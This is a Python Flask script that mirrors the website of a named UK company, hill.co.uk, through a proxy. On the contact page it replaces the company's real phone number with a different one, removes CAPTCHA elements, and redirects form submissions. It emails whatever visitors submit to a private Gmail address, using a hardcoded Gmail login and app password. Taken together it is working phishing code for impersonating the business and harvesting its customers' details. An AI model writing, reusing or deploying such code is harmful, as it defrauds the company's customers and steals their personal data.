from flask import Flask, render_template_string, request, redirect
from flask_cors import CORS
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

app = Flask(__name__)

base_url = "https://www.hill.co.uk/"
your_email = "shacamsserver@gmail.com"
smtp_password = "xrty tvld aghh iict"  # Use a secure method to store passwords

# Route for the main page
@app.route('/')
def home():
    return fetch_page(base_url)

# Route to fetch content from any page on the external site
@app.route('/fetch')
def fetch():
    relative_url = request.args.get('url', '')
    if not relative_url:
        return redirect('/')  # Redirect to home if no URL is provided

    full_url = urljoin(base_url, relative_url)

    # Prevent fetching non-internal URLs to avoid potential security issues
    if not is_internal_url(full_url):
        return redirect('/')  # Redirect to home if the URL is external

    return fetch_page(full_url)

# Route to handle form submission from contact-us page
@app.route('/contact-us', methods=['POST'])
def contact_us():
    if request.args.get('ajax_form') == '1' and request.args.get('_wrapper_format') == 'drupal_ajax':
        # Extract form data
        form_data = request.form
        subject = "Contact Us Form Submission"
        body = "\n".join([f"{key}: {value}" for key, value in form_data.items()])

        # Send email
        send_email(subject, body)
        return "Form submitted successfully!"

    return "Invalid request", 400

# Helper function to send email
def send_email(subject, body):
    sender_email = "shacamsserver@gmail.com"
    receiver_email = "daliresamuel@gmail.com"
    password = smtp_password

    # Create the email message
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    # Connect to Gmail's SMTP server
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
        server.login(sender_email, password)
        server.send_message(msg)

# Helper function to fetch and parse the page content
def fetch_page(full_url):
    response = requests.get(full_url)
    
    # Check for response status and handle errors
    if response.status_code != 200:
        return "Error fetching page", 500

    soup = BeautifulSoup(response.content, "html.parser")

    # Update relative URLs for CSS, JS, and images to absolute URLs
    for link in soup.find_all("link", href=True):
        link['href'] = urljoin(base_url, link['href'])
    for script in soup.find_all("script", src=True):
        script['src'] = urljoin(base_url, script['src'])
    for img in soup.find_all("img", src=True):
        img['src'] = urljoin(base_url, img['src'])
    for a in soup.find_all("a", href=True):
        a['href'] = urljoin(base_url, a['href'])
        # Ensure that links to 'contact-us' are handled correctly
        if "contact-us" in a['href']:
            a['onclick'] = f"window.location.href='/fetch?url={a['href']}'"
            a['href'] = '#'

    # Modify the telephone number on the contact-us page
    if 'contact-us' in full_url:
        phone_numbers = soup.find_all(text="020 8527 1400")
        for phone_number in phone_numbers:
            phone_number.replace_with("09278002991")

        # Remove or disable CAPTCHA elements
        captcha_iframes = soup.find_all("iframe", src=True)
        for iframe in captcha_iframes:
            if "captcha" in iframe['src']:
                iframe.decompose()

        captcha_divs = soup.find_all("div", class_="captcha")
        for div in captcha_divs:
            div.decompose()

        captcha_scripts = soup.find_all("script", src=True)
        for script in captcha_scripts:
            if "captcha" in script['src']:
                script.decompose()

        # Modify form action to point to our /submit route
        forms = soup.find_all("form")
        for form in forms:
            form['action'] = '/submit'

    # Return the cleaned HTML content
    return render_template_string(soup.prettify())

# Function to determine if the URL is internal
def is_internal_url(url):
    return urlparse(url).netloc == urlparse(base_url).netloc

if __name__ == '__main__':
    app.run(debug=True)